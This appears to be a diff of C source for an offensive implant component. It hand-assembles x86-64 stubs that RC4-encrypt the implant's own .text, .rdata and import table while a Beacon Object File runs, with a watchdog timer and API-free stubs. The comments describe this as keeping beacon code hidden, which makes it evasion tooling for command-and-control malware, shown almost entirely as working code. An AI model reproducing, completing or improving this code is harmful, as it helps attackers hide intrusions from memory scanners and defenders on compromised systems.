-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
-	e += 4;
-	e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
-	e += 3;
-	e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* mov r8d,[rax+0x74] orig */
-	e = bw_put32(e + 3, 0x74);
-	e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
-	e += 4;
+	{
+		int jne_at, ret_at;
+		e = p + BW_WATCH_OFF;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
+		e += 5;
+		e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
+		e += 2;
+		e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
+		e += 3;
+		jne_at = (int)(e - p);
+		e[0] = 0x0F; e[1] = 0x85;                                        /* jne rel32 wd_ret (patched) */
+		e = bw_put32(e + 2, 0);
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
+		e += 4;
+		e += bw_emit_refresh(e, bw_disp((int)(e - p) + 9, BW_SB0Q_OFF),
+		                        bw_disp((int)(e - p) + 16, BW_SB1Q_OFF));
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
+		e += 3;
+		e[0] = 0xE8;                                                     /* call rc4_prga */
+		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
+		e += 4;
+		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
+		e += 3;
+		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* r8d = [rax+0x74] orig */
+		e = bw_put32(e + 3, 0x74);
+		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* r9 = &vp_old */
+		e += 4;
 		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
 		e += 6;
 		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
 		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* mov rcx,-1 */
+		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* rcx=-1 */
 		e += 7;
-		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* mov rdx,[rax+0x58] buf */
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* rdx = buf */
 		e += 4;
-		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* mov r8d,[rax+0x50] len32 */
+		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* r8d = len32 */
 		e += 4;
-		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x80; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x80] flush */
+		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x90; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x90] flush */
 		e += 6;
-	e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
-	e += 4;
-	e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
-	e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
-	e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
-	e += 3;
-	e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
-	{
-		unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
-		memcpy(e + 6, &rest, 8); /* data qword sits at the instruction end */
+		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* add rsp,0x28 */
+		e += 4;
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
+		e[0] = 0x48; e[1] = 0x89; e[2] = 0xC1;                          /* mov rcx,rax */
+		e += 3;
+		e[0] = 0xFF; e[1] = 0x25;                                        /* jmp qword [rip+0] */
+		{
+			unsigned long long rest = (unsigned long long)(size_t)bw_watchdog_rest;
+			memcpy(e + 6, &rest, 8); /* data qword sits at the instruction end */
+		}
+		e += 14;
+		ret_at = (int)(e - p);
+		e[0] = 0xC3;                                                     /* wd_ret: ret */
+		e += 1;
+		bw_put32(p + jne_at + 2, ret_at - jne_at - 6);
+		if ((int)(e - (p + BW_WATCH_OFF)) > 0xA0)
+			BW_BUILD_FAIL();
 	}
-	e += 14;
-	e[0] = 0xC3;                                                     /* wd_ret: ret */
-	e += 1;
-	if ((int)(e - (p + BW_WATCH_OFF)) > 0x80)
-		BW_BUILD_FAIL();
 
-	/* the ctx qword all three stubs load rip-relatively */
+	/* the page-local PRGA + the qwords all stubs load rip-relatively */
+	memcpy(p + BW_RC4_OFF, BW_RC4_CODE, sizeof(BW_RC4_CODE));
 	bw_put64(p + BW_CTXQ_OFF, (unsigned long long)(size_t)g_bw_ctx);
+	bw_put64(p + BW_SB0Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox0);
+	bw_put64(p + BW_SB1Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox1);
 
 	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
 		BW_BUILD_FAIL();
@@ -563,6 +671,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		void (*enter_fn)(void);
 		BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
 	BOOL (*pFlush)(void *, const void *, SIZE_T);
+	BOOL (*pDelTimer)(void *, void *, void *);
 	unsigned int * k = (unsigned int *)key;
 
 	/* a background job thread could execute beacon code while the image is
@@ -592,6 +701,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 
 		pVP = VirtualProtect;
 		pFlush = FlushInstructionCache;
+		pDelTimer = (BOOL (WINAPI *)(void *, void *, void *))(void *)DeleteTimerQueueTimer;
 		/* capture the stub address NOW - g_bw_stubs lives in .data and is
 		 * ciphertext after the mask loop. */
 		enter_fn = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
@@ -615,6 +725,10 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	ctx->u_text.Length = ctx->u_text.MaximumLength = blocks[text_idx].len;
 	ctx->u_key.Buffer = ctx->key;
 	ctx->u_key.Length = ctx->u_key.MaximumLength = 16;
+	/* the stub-side PRGA state: KSA in plaintext C, pristine copy in
+	 * sbox0 (exit/watchdog rep-movsq it over sbox1 before unmasking) */
+	bw_kasa(ctx->sbox0, key, (unsigned int)text_idx);
+	memcpy(ctx->sbox1, ctx->sbox0, 256);
 
 	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
 	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
@@ -634,21 +748,23 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		DWORD oldp = 0;
 		if (i == text_idx)
 			continue;
-		if (!VirtualProtect(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
-			bw_blocks_restore(blocks, nblocks, text_idx);
-			DeleteTimerQueueTimer(NULL, timer, NULL);
+		if (!pVP(blocks[i].ptr, blocks[i].len, PAGE_READWRITE, &oldp)) {
+			bw_blocks_restore(blocks, nblocks, text_idx, pVP);
+			pDelTimer(NULL, timer, NULL);
 			ctx->state = BW_STATE_IDLE;
 			return FALSE;
 		}
+		ctx->phase = 10 + i;
 		bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
 	}
-	ctx->phase = 2; /* all but .text masked; NO API CALLS from here until the
-	                 * exit stub returns (.rdata and the IAT are ciphertext) */
+	ctx->phase = 2; /* all but .text masked; the stubs run API-free now (the
+	                 * page PRGA replaced SystemFunction032 after the round-4
+	                 * CNG crash), but keep the no-IAT discipline anyway */
 
 	/* from here to the exit stub this thread may only touch: stack, ctx
-	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
-	 * enters the BOF; the BOF's ret -> exit_stub restores .text + RX and
-	 * returns into THIS frame. */
+	 * page, stub page. enter_stub flips .text to RW, masks it via the page
+	 * PRGA (last block), enters the BOF; the BOF's ret -> exit_stub
+	 * restores .text + RX and returns into THIS frame. */
 		bw_call_enter(enter_fn);
 	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
 	                 * .rdata (and the IAT) is still ciphertext */
@@ -659,18 +775,26 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	 * remaining protections, THEN touch any IAT. */
 	if (InterlockedExchange(&ctx->rest_done, 1) == 0) {
 		for (i = 0; i < nblocks; i++) {
-			if (i != text_idx)
+			if (i != text_idx) {
+				ctx->phase = 40 + i;
 				bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
+			}
 		}
 	}
-	bw_blocks_restore(blocks, nblocks, text_idx);
-	DeleteTimerQueueTimer(NULL, timer, NULL);
+	bw_blocks_restore(blocks, nblocks, text_idx, pVP);
+	ctx->phase = 6;
+	pDelTimer(NULL, timer, NULL);
+	ctx->phase = 7;
 	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */
 
 	memset(key, 0, sizeof(key));
 	memset(ctx->key, 0, 16);
+	memset(ctx->key2, 0, 16);
+	memset(ctx->sbox0, 0, 256);
+	memset(ctx->sbox1, 0, 256);
 	memset(ctx->storage, 0, sizeof(ctx->storage));
 	ctx->state = BW_STATE_IDLE;
+	ctx->phase = 8;
 	(void)k;
 	return TRUE;
 }
